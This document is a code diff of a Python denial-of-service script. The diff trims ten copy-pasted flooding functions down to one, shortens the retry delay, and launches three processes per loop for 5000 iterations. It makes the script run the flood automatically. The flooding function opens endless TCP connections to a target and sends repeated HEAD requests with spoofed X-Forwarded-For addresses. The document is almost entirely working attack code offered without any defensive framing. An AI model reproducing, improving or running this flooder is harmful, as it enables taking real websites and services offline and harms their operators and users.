@@ -43,202 +43,21 @@ def attack():
       for y in range(100):
           atk.send(str.encode(request))
     except socket.error:
-      time.sleep(1)
+      time.sleep(.1)
     except:
       pass
 
-def attack2():
-  connection = "Connection: null\r\n"
-  referer = "Referer: null\r\n"
-  forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-  request = get_host + referer  + connection + forward + "\r\n\r\n"
-  while True:
-    try:
-      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      atk.connect((ip, port))
-      #Attack starts here
-      for y in range(100):
-          atk.send(str.encode(request))
-    except socket.error:
-      time.sleep(1)
-    except:
-      pass
-
-def attack3():
-  connection = "Connection: null\r\n"
-  referer = "Referer: null\r\n"
-  forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-  request = get_host + referer  + connection + forward + "\r\n\r\n"
-  while True:
-    try:
-      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      atk.connect((ip, port))
-      #Attack starts here
-      for y in range(100):
-          atk.send(str.encode(request))
-    except socket.error:
-      time.sleep(1)
-    except:
-      pass
-
-def attack4():
-  connection = "Connection: null\r\n"
-  referer = "Referer: null\r\n"
-  forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-  request = get_host + referer  + connection + forward + "\r\n\r\n"
-  while True:
-    try:
-      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      atk.connect((ip, port))
-      #Attack starts here
-      for y in range(100):
-          atk.send(str.encode(request))
-    except socket.error:
-      time.sleep(1)
-    except:
-      pass
-
-def attack5():
-  connection = "Connection: null\r\n"
-  referer = "Referer: null\r\n"
-  forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-  request = get_host + referer  + connection + forward + "\r\n\r\n"
-  while True:
-    try:
-      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      atk.connect((ip, port))
-      #Attack starts here
-      for y in range(100):
-          atk.send(str.encode(request))
-    except socket.error:
-      time.sleep(1)
-    except:
-      pass
-
-def attack6():
-  connection = "Connection: null\r\n"
-  referer = "Referer: null\r\n"
-  forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-  request = get_host + referer  + connection + forward + "\r\n\r\n"
-  while True:
-    try:
-      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      atk.connect((ip, port))
-      #Attack starts here
-      for y in range(100):
-          atk.send(str.encode(request))
-    except socket.error:
-      time.sleep(1)
-    except:
-      pass
-
-def attack7():
-  connection = "Connection: null\r\n"
-  referer = "Referer: null\r\n"
-  forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-  request = get_host + referer  + connection + forward + "\r\n\r\n"
-  while True:
-    try:
-      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      atk.connect((ip, port))
-      #Attack starts here
-      for y in range(100):
-          atk.send(str.encode(request))
-    except socket.error:
-      time.sleep(1)
-    except:
-      pass
-
-def attack8():
-  connection = "Connection: null\r\n"
-  referer = "Referer: null\r\n"
-  forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-  request = get_host + referer  + connection + forward + "\r\n\r\n"
-  while True:
-    try:
-      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      atk.connect((ip, port))
-      #Attack starts here
-      for y in range(100):
-          atk.send(str.encode(request))
-    except socket.error:
-      time.sleep(1)
-    except:
-      pass
-
-def attack9():
-  connection = "Connection: null\r\n"
-  referer = "Referer: null\r\n"
-  forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-  request = get_host + referer  + connection + forward + "\r\n\r\n"
-  while True:
-    try:
-      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      atk.connect((ip, port))
-      #Attack starts here
-      for y in range(100):
-          atk.send(str.encode(request))
-    except socket.error:
-      time.sleep(1)
-    except:
-      pass
-
-def attack10():
-  connection = "Connection: null\r\n"
-  referer = "Referer: null\r\n"
-  forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-  request = get_host + referer  + connection + forward + "\r\n\r\n"
-  while True:
-    try:
-      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      atk.connect((ip, port))
-      #Attack starts here
-      for y in range(100):
-          atk.send(str.encode(request))
-    except socket.error:
-      time.sleep(1)
-    except:
-      pass
-
+    
 def sendattack():
   for i in range(5000):
-    mp = multiprocessing.Process(target=attack) 
-    mp2 = multiprocessing.Process(target=attack2)
-    mp3 = multiprocessing.Process(target=attack3)
-    mp4 = multiprocessing.Process(target=attack4)
-    mp5 = multiprocessing.Process(target=attack5)
-    mp6 = multiprocessing.Process(target=attack6)
-    mp7 = multiprocessing.Process(target=attack7)
-    mp8 = multiprocessing.Process(target=attack8)
-    mp9 = multiprocessing.Process(target=attack9)
-    mp10 = multiprocessing.Process(target=attack10)
+    mp = multiprocessing.Process(target=attack)
+    mp2 = multiprocessing.Process(target=attack)
+    mp3 = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp2.setDaemon = False
     mp3.setDaemon = False
-    mp4.setDaemon = False
-    mp5.setDaemon = False
-    mp6.setDaemon = False
-    mp7.setDaemon = False
-    mp8.setDaemon = False
-    mp9.setDaemon = False
-    mp10.setDaemon = False
     mp.start()
     mp2.start()
     mp3.start()
-    mp4.start()
-    mp5.start()
-    mp6.start()
-    mp7.start()
-    mp8.start()
-    mp9.start()
-    mp10.start()
-    
+
+sendattack()
